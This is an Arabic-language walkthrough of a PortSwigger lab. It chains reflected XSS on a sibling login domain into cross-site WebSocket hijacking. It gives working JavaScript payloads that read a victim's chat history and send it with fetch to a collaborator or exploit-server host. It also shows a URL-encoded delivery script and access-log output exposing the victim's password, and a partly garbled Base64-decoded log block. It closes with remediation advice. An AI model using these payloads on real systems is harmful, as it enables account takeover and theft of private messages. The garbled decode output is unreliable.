# [SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

## **`الهدف`**
إنشاء كود `HTML/JS` يقوم بعمل هجوم `cross-site WebSocket hijacking (CSWSH)` لاستخراج سجل محادثات الضحية، ثم استخدام ذلك للوصول إلى حسابه.
## **`خطوات الحل`**
**`ملاحظة:`** الحل الرسمي لهذا اللاب يحتاج إلى استعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`، ولكن يمكن حله بدونها تمامًا عن طريق الـ `Severver Log`.

عند الضغط على `F12` سنلاحظ أن الـ `cookie` في هذا اللاب لديها سمة `Same Site = Strict`، وهذا يعنى أنه لا يمكن إرسال الـ `cookies` في أى هجوم `CSRF` في هذا الدومين.

ولكن عند التوجه إلى `Http history` داخل `Burp` سنلاحظ وجود هذا الـ `request` الذي يحتوى على هذا المسار `/resources/js/chat.js`، وبفحص الـ `response` الخاص به
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
Access-Control-Allow-Origin: https://cms-0a6f004e04dbf4ca801e62f8006600e0.web-security-academy.net
X-Frame-Options: SAMEORIGIN
Content-Length: 3561
```

سنجد `sibling domain` وبالتوجه له، سنلاحظ أنه مجرد صفحة بسيطة لتسجيل الدخول، وإذا قمنا بتجربة حقن أى أوامر `JS` في خانة الـ `Username` مثل:
```html
<script>alert(1)</script>
```
ونضع كلمة مرور عشوائية ونضغط `Log in` سنجد أنه قد تم تنفيذ السكريبت بدون أى حماية،وإذا قمنا بتحويل هذا الـ `request` إلى `repeater` وغيرنا الـ `METHOD` إلى `GET` سنجد أنه يتم تنفيذ السكريبت كذلك، وهذا يعنى انه يمكن أن نستغل هذه الخانة لتنفيذ سكريبت هجوم `CSRF`.

لذلك سنقوم بتجهيز إحدي الأكواد التالية مع تغيير الـ `URL` الخاص باللاب والسيرفر الحاليين  لن نستعمله، فقط سنجهزه للخطوة التالية)

هذا الكود يتطلب `Burb Collaborator` أو إذا كان اختبار ثغرة في موقع حقيقي فيمكن وضع سيرفرك الخاص.
```html
<script> 
	var ws = new WebSocket('wss://your-websocket/lAB-url');
	ws.onopen = function() { 
		ws.send("READY");
	};
	ws.onmessage = function(event) {
		fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
	}; 
</script>
```

هذا الكود يعمل على الـ `Access Log` الخاص بالسيرفر، ولمزيد من المعلومات حول تفاصيل الكود، انظر [`فيديو اليوتيوب`](https://youtu.be/8RmZ1PbNZ7Y) على قناة `Jarno Timmermans`.

```html
<script>
    var ws = new WebSocket(
        "wss://0a6f004e04dbf4ca801e62f8006600e0.web-security-academy.net/chat"
    );

    ws.onopen = function () {
        ws.send("READY");
    };

    ws.onmessage = function (event) {
        fetch(
            "https://exploit-0a5100bf0483f41e800061ea011500a1.exploit-server.net/exploit?message=" +
            btoa(event.data)
        );
    };
</script>
```

وبعد ذلك سنقوم بنسج السكريبت إلى `Burp Decoder` وعمل `URL Encoded` له، ونقوم بنسخ النتيجة ونضعها فى قيمة الـ `Username` بنفس صيغة الجزء الأول من الـ `request` الموجود في الـ `repeater` (ملاحظة نحن لن نضغه فى الـ `repeater` ولكن سنتعمله كنص فقط بنفس الصيغة) وبعد ذلك  نقوم بالتوجه إلى السيرفر الموجود في اللاب ونقوم بعمل سكريبت ليصبح بهذه الطريقة النهائية (مع مراعاة عدم نسيان وجود قيمة لـ `Password` وأن نستعمل الـ `Sibiling domain` وليس الدومين الأصلي للاب).

```html
<script>
document.location ="https://cms-0a6f004e04dbf4ca801e62f8006600e0.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%0a%20%20%20%20%20%20%20%20%22%77%73%73%3a%2f%2f%30%61%36%66%30%30%34%65%30%34%64%62%66%34%63%61%38%30%31%65%36%32%66%38%30%30%36%36%30%30%65%30%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%0a%20%20%20%20%29%3b%0a%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%0a%20%20%20%20%20%20%20%20%20%20%20%20%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%35%31%30%30%62%66%30%34%38%33%66%34%31%65%38%30%30%30%36%31%65%61%30%31%31%35%30%30%61%31%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%0a%20%20%20%20%20%20%20%20%20%20%20%20%62%74%6f%61%28%65%76%65%6e%74%2e%64%61%74%61%29%0a%20%20%20%20%20%20%20%20%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=test";
</script>
```

ونقوم بالضغط على `Store` ثم `Deliver exploit to victim` وبعد ذلك نتوجه إلى `Access log` لنلاحظ وجود عدة أسطر تشبه التالي

```
10.0.4.244      2026-08-11 06:52:07 +0000 "GET /exploit?message=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IkhlbGxvLCBob3cgY2FuIEkgaGVscD8ifQ== HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
10.0.4.244      2026-08-11 06:52:07 +0000 "GET /exploit?message=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgM3dkMXF3eWIwYXh6cW5uc2w0M2UifQ== HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
10.0.4.244      2026-08-11 06:52:07 +0000 "GET /exploit?message=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0= HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
10.0.4.244      2026-08-11 06:52:07 +0000 "GET /exploit?message=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IlRoYW5rcywgSSBob3BlIHRoaXMgZG9lc24mYXBvczt0IGNvbWUgYmFjayB0byBiaXRlIG1lISJ9 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
10.0.4.244      2026-08-11 06:52:07 +0000 "GET /exploit?message=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
```

فنقوم بنسخ جميعها ونتوجه إلى `Burp Decoder` ونقوم بعمل `Base64 Decode` ليظهر كالتالي:
```
10.0.4.244      ÛMº-08-11 06:52:07 +0000 "GET ýìi­?ë,j{"user":"Hal Pline","content":"Hello, how can I help?"} 4Ïÿ.1" 200 "ºÇ«-agent: Mozilla/5.0 (V'-) eyg*+ç~.36 (KHTML, ) Gecko) 
èïõç.0.0.0 I§Ú®/ùß.36"
10.0.4.244      ÛMº-08-11 06:52:07 +0000 "GET ýìi­?ë,j{"user":"Hal Pline","content":"No problem carlos, it&apos;s 3wd1qwyb0axzqnnsl43e"} 4Ïÿ.1" 200 "ºÇ«-agent: Mozilla/5.0 (V'-) eyg*+ç~.36 (KHTML, ) Gecko) 
èïõç.0.0.0 I§Ú®/ùß.36"
10.0.4.244      ÛMº-08-11 06:52:07 +0000 "GET ýìi­?ë,j{"user":"You","content":"I forgot my password"} 4Ïÿ.1" 200 "ºÇ«-agent: Mozilla/5.0 (V'-) eyg*+ç~.36 (KHTML, ) Gecko) 
èïõç.0.0.0 I§Ú®/ùß.36"
10.0.4.244      ÛMº-08-11 06:52:07 +0000 "GET ýìi­?ë,j{"user":"You","content":"Thanks, I hope this doesn&apos;t come back to bite me!"} 4Ïÿ.1" 200 "ºÇ«-agent: Mozilla/5.0 (V'-) eyg*+ç~.36 (KHTML, ) Gecko) 
èïõç.0.0.0 I§Ú®/ùß.36"
10.0.4.244      ÛMº-08-11 06:52:07 +0000 "GET ýìi­?ë,j{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"} 4Ïÿ.1" 200 "ºÇ«-agent: Mozilla/5.0 (V'-) eyg*+ç~.36 (KHTML, ) Gecko) 
èïõç.0.0.0 I§Ú®/ùß.36"
```

سنلاحظ وجود سطر به عبارة `I forgot my password` وفى السطور التالية سنجد هذه الجزئية 
`No problem carlos, it&apos;s 3wd1qwyb0axzqnnsl43e`، 
وهذا يعنى أن كلمة المرور هي `3wd1qwyb0axzqnnsl43e`، لذللك سنقوم بتسجيل الدخول لحساب `carlos:3wd1qwyb0axzqnnsl43e` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`بالإضافة إلى جزء كبير من ترقيع لاب`** [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)

فيجب على السيرفر أن يقوم بترميز `HTML Encoding` لأي مدخلات في صفحة `Login` قبل عرضها في هذه الصفحة أو أي صفحة أخرى، أي يجب على السيرفر نفسه تحويل الأقواس `<` و `>` إلى `&lt;` و `&gt;`.

ويجب على المبرمجين تعديل كود `JS` في المتصفح `Frontend` أن يتعامل مع هذه الرسالة كنص عادي `Plain Text` وليس ككود `HTML`.

ويجب على السيرفر تطبيق سياسة التحقق من المدخلات `Input Validation` بناءً على قائمة بيضاء `Whitelist` لرفض أي رموز غير متوقعة، فحتى لو حاول المهاجم التلاعب بالبيانات من جهة العميل، سيتدخل السيرفر ويرفض الطلب ويمنع إدخال أكواد `JavaScript` بفضل هذه الفلترة الصارمة.

ويجب على المطور الاعتماد على محركات قوالب `Template Engines` حديثة تدعم التشفير التلقائي `Auto-escaping`، فحتى لو نسي المطور معالجة بعض المدخلات يدوياً، سيتدخل إطار العمل `Framework` ويشفر البيانات ويمنع تفعيل وسم `script` بفضل هذه الحماية المدمجة.

وكطبقة حماية إضافية، يجب على السيرفر إرسال ترويسة `CSP` صارمة تمنع تنفيذ أكواد `JS` المدمجة `Inline Scripts` مثل الموجودة في `onerror`، فحتى لو فشل السيرفر في فلترة البيانات، سيتدخل المتصفح ويمنع تنفيذ الـ `alert()` بفضل هذه السياسة.

ويجب أن لا يتم إرسال أى بيانات حساسة مثل سجل المحادثات إلا بعد أن يقوم العميل `Client` بإرسال رسالة مصادقة مثل `JWT` أو `API Key` كأول رسالة عبر الـ `WebSocket` نفسه. 

ويجب الاهتمام بتطبيق نفس المعايير على جميع الـ `domains` التابعة للموقع.
